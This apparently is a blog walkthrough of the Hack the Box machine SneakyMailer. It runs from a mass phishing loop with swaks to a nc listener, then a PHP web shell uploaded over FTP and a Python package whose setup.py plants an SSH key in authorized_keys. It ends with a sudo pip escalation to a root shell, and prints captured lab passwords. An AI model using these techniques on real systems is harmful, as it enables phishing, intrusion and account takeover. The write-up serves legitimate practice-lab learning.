+++
author = "Nick"
categories = ["hack the box", "CTF", "medium", "Linux", "python", "pypi", "reverse shell", "GTFObins", "sudo"]
date = 2020-11-28T15:36:51Z
description = ""
draft = false
thumbnail = "/images/2020/10/info.png"
slug = "hack-the-box-sneakymailer"
summary = "Welcome back everyone! Today we are doing the Hack the Box machine - SneakyMailer. This is listed as a medium difficulty Linux machine. Let's see what's in store."
tags = ["hack the box", "CTF", "medium", "Linux", "python", "pypi", "reverse shell", "GTFObins", "sudo"]
title = "Hack the Box - SneakyMailer"
url = "/hack-the-box-sneakymailer"

+++


Welcome back everyone! Today we are doing the Hack the Box machine - SneakyMailer. This is listed as a medium difficulty Linux machine. Let's see what's in store.

As always, we start with our normal `nmap`: `nmap -sC -sV -p- -oA allscan 10.10.10.197`

Here are our results:
```
Nmap scan report for 10.10.10.197
Host is up (0.052s latency).
Not shown: 65528 closed ports
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
80/tcp   open  http     nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://sneakycorp.htb
143/tcp  open  imap     Courier Imapd (released 2018)
|_imap-capabilities: CHILDREN THREAD=ORDEREDSUBJECT IDLE ACL2=UNION UTF8=ACCEPTA0001 UIDPLUS CAPABILITY ACL STARTTLS THREAD=REFERENCES IMAP4rev1 SORT completed NAMESPACE QUOTA ENABLE OK
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
993/tcp  open  ssl/imap Courier Imapd (released 2018)
|_imap-capabilities: CHILDREN THREAD=ORDEREDSUBJECT IDLE ACL2=UNION UTF8=ACCEPTA0001 UIDPLUS CAPABILITY ACL THREAD=REFERENCES IMAP4rev1 AUTH=PLAIN SORT completed NAMESPACE QUOTA ENABLE OK
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     nginx 1.14.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

There are some interesting ports here. We have a hostname of `sneakycorp.htb` being show, so we'll add that to our hosts list and see what's being hosted.

We are greeted with a dashboard of types. When we browse around it, we find another hostname, `sneakymailer.htb`. We'll add that as well. We'll start with some basic enumeration:

Command:
`gobuster dir -u http://sneakycorp.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x php`

We'll also re-run this against the `8080` port. We don't anything great back. When we browse the site, we have a large listing of email addresses. So we'll take all of these and put them in a list. 

Command:
`curl http://sneakycorp.htb/team.php | grep '@' | sed 's/\(<td>\|<\/td>\)//g;s/|/\n/g' >> email.lst`

Then clean up our list of spaces:
`cat email.lst| sed -e 's/^[ \t]*//' >> clean_email.lst`

Given we have such a large amount of email ports available we should try to see if we can spoof an email on the machine. We can test this by simply `telnet`ing to the port and sending a hail.

Command:
`telnet sneakymailer.htb 25`
`EHLO`

![](/images/2020/10/image-14.png)

It looks like we can send un-authorized messages on the system. If you've had to thinker with SMTP before you might be familiar with [Swaks](http://www.jetmore.org/john/code/swaks/). We'll download this to our machine.

Command:
`wget https://jetmore.org/john/code/swaks/files/swaks-20201014.0/swaks && chmod +x swaks`

Now armed with a tool for sending emails and a list of emails, we should do just that. Send emails to those email's we got, with a phishing link inside. In this case, the body of the email will just be some basic text we made in a file. The subject will be a link to our machine with a listener. Here is the basic command we'll use to send an email.

Command:
`swaks --from "it@sneakymailer.htb" --to "donnasnider@sneakymailer.htb" --server "10.10.10.197" --body emailbody --header "Subject: http://10.10.14.106"`

But we don't want to do this on every email account, so we'll make a quick script. In this case we'll just do it right in the shell:

Command:
```
while read mail; do swaks –-to $mail --from root --header "Subject: http://10.10.14.106" –-body emailbody  –server 10.10.10.197 --ehlo debain; done < clean_email.lst
```

We want to ensure our listener is up as well:

Command:
`nc -lvnp 80`

There is also an example on how to loop using `swaks` in the `--help` command for the application. Eventually, we get back a response:

![](/images/2020/10/image-15.png)

We can take this and toss it into `burpsuite` for decoding, or any other URL decoder you like. When we do, we get back our password.

```
firstName=Paul&lastName=Byrd&email=paulbyrd@sneakymailer.htb&password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht&rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
```

Now that we have a password, we can try it against FTP. No dice. We'll, we have an email password, let's try to log into Paul's email. There are a few email clients out there. Commonly `Evolution` is easy and fast to get.

Command:
`apt install Evolution`

Once installed we'll create pauls account on the client. The wizard will guide us through most, we just want to ensure our settings are as such:

![](/images/2020/10/image-16.png)

![](/images/2020/10/image-17.png" caption="Note the port change to 25)

Once we've setup the account, it will attempt to login. We get a certificate erropr which is fine, we'll accept it.

![](/images/2020/10/image-18.png)

Now we can enter our password.

![](/images/2020/10/image-21.png)

We get into the account. Not much here, just two sent emails. One is great for us. It tells us an account and password!

![](/images/2020/10/image-22.png)

The other mail is a basic task. Now we didn't see a respone from the admin about the password being changed, so it still might work. Let's try.

![](/images/2020/10/image-23.png)

They do indeed work for FTP! We see one folder, `dev`. Inside is some code for a site. We download some files and sift through them, nothing to great. However, what is interesting about this directory permissions is that we seem to have the  ability to upload files to it. We'll modify one of our `PHP Shells` and upload it to the `dev` directory.

Command:
`ftp> put sh3ll.php`

![](/images/2020/10/image-24.png)

Now when you try to browse to this, you notice you cannot find the page. That's because `dev` is a subdomain of sneakymailer. We could have found this by using something like `wfuzz`/`ffuf` or even `nmap`. So the URL we want to catch is actually `http://dev.sneakycorp.htb/sh3ll.php`. Although we are unable to browse to the URL, we can `curl` the path to our shell.

![](/images/2020/10/sneakymailershell.gif)

Next we can upgrade our shell to be more interactive. Let's look around. First I'm going to grab a copy of `linpeas` and run it to see what that finds. Some interesting data comes back, like the `.htpasswd` for `pypi.sneakycorp.htb`. We'll try to `su` to the developer account. It works.

Command:
`su -u developer`

![](/images/2020/10/image-25.png)

Now with a shell as developer, we'll re-run our enum script. We see pretty much the same things. What's interesting about the network scan is that both accounts listening on `localhost:5000`.

![](/images/2020/10/image-26.png)

When we `curl` it, we get back `pypi` response page.

![](/images/2020/10/image-27.png)

Doing some research about pypiserver lets  us know that it runs on `8080` by default. Sure enough, we browse to it and get the same response we did from curl. Now what? Well, we have that hash from our `linpeas`. We might as well try and crack it to see if it's the same password as `low`.

Command:
`john hash -w=/usr/share/wordlists/rockyou.txt`

![](/images/2020/10/image-28.png)

It is not the same password. Bummer. More research leads us to creating our own package that has a reverse shell in it. If we can get `pypi` to load it, we might be able to execute code. [Here](https://packaging.python.org/tutorials/packaging-projects/) is the documentation on how to create a package. It's not that hard, but the short is we need a `setup.py`, `.pypirc` and a `README.md`.

It's best to create these files locally and then get them onto the target.

Command:
`touch README.me`

Content of the `setup.py`:
```python
from setuptools import setup

try:
	with open ('/home/low/.ssh/authorized_keys', 'w+') as z:
		z.writelines('ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDwAGc7soMw+exi0QO2RdhJ59eStMXASXKKppNGGxO9bdPzlJUVZ/OJHTB21yR5jsp8afJe5FD7r2vxsUlhO4wYzQV8ta+tiePnr1TcEfyjBobsGBhaKWCWannx9kMXYUfSJCADdYd5NcxXEWgyfUyMmvS9dhB8sv5pEvFlgk3gy1nCHkPmCmRk2AdaE2vhWTYclK5HgPnBP/ijIeC76H0gX/Vc3HwMj+68GxIVQHKJKvlz6YM5NK7tQom6rON8RLM4iBXT4Vzw2vXgGitwV0HGaPLw+e6IV1qNZtSSxeAhmwpqwp7c8VlBybrVvsquuIh44bTGDs6irkK9uW+SM0JiKYXkRvyDWfcKn/k0Hqqg9rSv5pqymhGUSwd4txJCRtvkJ960HnnZflVmeJGyet7k8FkyGaO1ipNNtCbld2gAB/4w5ZYAM54iWb3gSsfnPoTU+XWDI6i/I0KNrto9sXLOW/k7TQUEdFlTy2TZWIEkTSx9MGGmFeRZxvXNy36svGc= root@rootflag.io')
except:
	setup(
        name='',
    	packages=[''],
    	description='Shell Me',
    	version='1.0',
    	url='https://rootflag.io',
    	author='Lovecore',
    	author_email='nick@rootflag.io',
    	keywords=['pip','rootflag']
    	)
```

Content of the `.pypirc` file:
```python
[distutils]
index-servers = local

[local]
repository: http://pypi.sneakycorp.htb:8080
username: pypi
password: soufianeelhaoui
```

With these files, we'll transfer them over to our target. Next we need to set our `HOME` variable so `pypi` looks to where we currently are for its repo data.

Command:
`export HOME=/tmp/rootflag`

Now we just register and  upload our package.

Command:
`python3 setup.py sdist register -r local upload -r local`

![](/images/2020/10/image-29.png)

We get a warning saying this method is depreciated, but we also get a response of 200. So if all went well, we should be able to SSH in as low.

Command:
`ssh -i key low@sneakymailer.htb`

![](/images/2020/10/image-30.png)

We're in! Now to snag our flag and start enumerating internally. As always we check our `sudo -l` first to see if we have some low hanging fruit. This time it seems we might. When we issue the command we see root ability on `pip3`. Some [research](https://gtfobins.github.io/gtfobins/pip/) [suggests](https://root4loot.com/post/pip-install-privilege-escalation/) we can indeed use this to escalate.

Commands:
`TF=$(mktemp -d)`
`echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py`
`pip install $TF`

![](/images/2020/10/sneakymailer.gif)

There we have it, the root flag! This was a fun path in. Hopefully something was learned along the way. Feel free to send some respect my way if this helped you out!

[Hack the Box Profile](https://app.hackthebox.eu/profile/95635)



